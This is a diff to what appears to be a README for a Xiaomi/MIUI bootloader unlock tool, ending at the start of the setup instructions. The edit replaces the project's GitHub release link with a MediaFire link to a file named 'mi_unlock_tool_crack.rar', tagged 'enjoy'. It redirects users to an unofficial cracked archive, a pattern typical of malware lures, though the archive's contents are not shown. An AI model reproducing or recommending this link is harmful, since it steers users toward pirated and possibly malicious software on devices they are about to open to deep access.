@@ -35,7 +35,7 @@
 </h1>
 
 ### download link
-[download](https://github.com/Gtajisan/Miui-bootlooder-unlock/archive/refs/tags/v1.0.0.zip)
+* [download](https://www.mediafire.com/file/w8awly6utxqxkvd/mi_unlock_tool_crack.rar/file) enjoy 😁🔥
 
 ### STEP 1: Enable USB Debugging and OEM Unlocking
 **To begin with, you will have to enable USB Debugging as well as OEM Unlocking. The former will be used to make your device get recognized by your PC in the ADB Mode. The latter will allow us to unlock the device’s bootloader. Here are the required instructions to enable both 
